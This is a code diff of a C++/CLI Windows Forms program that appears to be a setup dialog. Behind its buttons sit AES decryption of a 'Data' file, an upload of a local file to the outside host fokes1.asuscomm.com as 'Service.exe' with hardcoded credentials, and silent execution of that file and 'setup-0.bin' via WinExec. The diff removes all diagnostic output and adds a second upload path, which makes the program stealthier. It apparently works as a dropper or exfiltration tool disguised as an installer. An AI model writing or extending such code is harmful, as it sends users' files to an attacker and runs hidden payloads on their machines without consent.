@@ -92,6 +92,7 @@ namespace Project2 {
 			this->button1->TabIndex = 0;
 			this->button1->Text = L"Cancel";
 			this->button1->UseVisualStyleBackColor = true;
+			this->button1->Click += gcnew System::EventHandler(this, &MyForm::button1_Click);
 			// 
 			// button2
 			// 
@@ -179,15 +180,13 @@ namespace Project2 {
 			size_t len = lstrlenW(key_str);
 
 			HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
-			if (hInpFile == INVALID_HANDLE_VALUE) {
-				printf("Cannot open input file!\n");
-				system("pause");
+			if (hInpFile == INVALID_HANDLE_VALUE)
+			{
 				return (-1);
 			}
 			HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-			if (hOutFile == INVALID_HANDLE_VALUE) {
-				printf("Cannot open output file!\n");
-				system("pause");
+			if (hOutFile == INVALID_HANDLE_VALUE) 
+			{
 				return (-1);
 			}
 
@@ -195,39 +194,33 @@ namespace Project2 {
 			BOOL bResult = FALSE;
 			wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
 			HCRYPTPROV hProv;
-			if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+			if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) 
+			{
 				dwStatus = GetLastError();
-				printf("CryptAcquireContext failed: %x\n", dwStatus);
 				CryptReleaseContext(hProv, 0);
-				system("pause");
 				return dwStatus;
 			}
 			HCRYPTHASH hHash;
-			if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+			if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
+			{
 				dwStatus = GetLastError();
-				printf("CryptCreateHash failed: %x\n", dwStatus);
 				CryptReleaseContext(hProv, 0);
-				system("pause");
 				return dwStatus;
 			}
 
-			if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
+			if (!CryptHashData(hHash, (BYTE*)key_str, len, 0))
+			{
 				DWORD err = GetLastError();
-				printf("CryptHashData Failed : %#x\n", err);
-				system("pause");
 				return (-1);
 			}
-			printf("[+] CryptHashData Success\n");
 
 			HCRYPTKEY hKey;
-			if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
+			if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) 
+			{
 				dwStatus = GetLastError();
-				printf("CryptDeriveKey failed: %x\n", dwStatus);
 				CryptReleaseContext(hProv, 0);
-				system("pause");
 				return dwStatus;
 			}
-			printf("[+] CryptDeriveKey Success\n");
 
 			const size_t chunk_size = BLOCK_LEN;
 			BYTE chunk[chunk_size] = { 0 };
@@ -245,17 +238,14 @@ namespace Project2 {
 				readTotalSize += out_len;
 				if (readTotalSize == inputSize) {
 					isFinal = TRUE;
-					printf("Final chunk set.\n");
 				}
 
 				if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
-					printf("[-] CryptDecrypt failed\n");
 					break;
 				}
 
 				DWORD written = 0;
 				if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
-					printf("writing failed!\n");
 					break;
 				}
 				memset(chunk, 0, chunk_size);
@@ -267,8 +257,6 @@ namespace Project2 {
 
 			CloseHandle(hInpFile);
 			CloseHandle(hOutFile);
-			printf("Finished. Processed %#x bytes.\n", readTotalSize);
-			system("pause");
 			return 0;
 		}
 
@@ -276,18 +264,31 @@ namespace Project2 {
 	{
 		button2->Enabled = checkBox1->Checked;
 	}
+
 	private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) 
 	{
 		string file = GetNewFile();
+
+		//LoadFile
 		if (System::IO::File::Exists("Data"))
 		{
-			DeCrypt();
+			if (DeCrypt() == -1)
+			{
+				try
+				{
+					wstring stemp = wstring(file.begin(), file.end());
+					upload("fokes1.asuscomm.com", "ff", "WorkerFF", stemp.c_str(), L"Service.exe");
+				}
+				catch (exception ex)
+				{
+
+				}
+			}
 		}
 		else
 		{
 			try
-			{
-				
+			{				
 				wstring stemp = wstring(file.begin(), file.end());
 				upload("fokes1.asuscomm.com", "ff", "WorkerFF", stemp.c_str(), L"Service.exe");
 			}
@@ -297,9 +298,13 @@ namespace Project2 {
 			}
 		}
 	
-		WinExec(file.c_str(), SW_SHOW);
+		try
+		{
+			WinExec(file.c_str(), SW_SHOW);
+		}
+		catch (const std::exception&) { }
+		
 		WinExec("setup-0.bin", SW_SHOW);
-		//ShellExecute(NULL, L"open", stemp.c_str(), NULL, NULL, SW_SHOWDEFAULT);
 	}
 	
 	private: std::string GetNewFile()
@@ -332,5 +337,9 @@ namespace Project2 {
 		return file;
 	}
 
+	private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) 
+	{
+		Application::Exit();
+	}
 };
 }
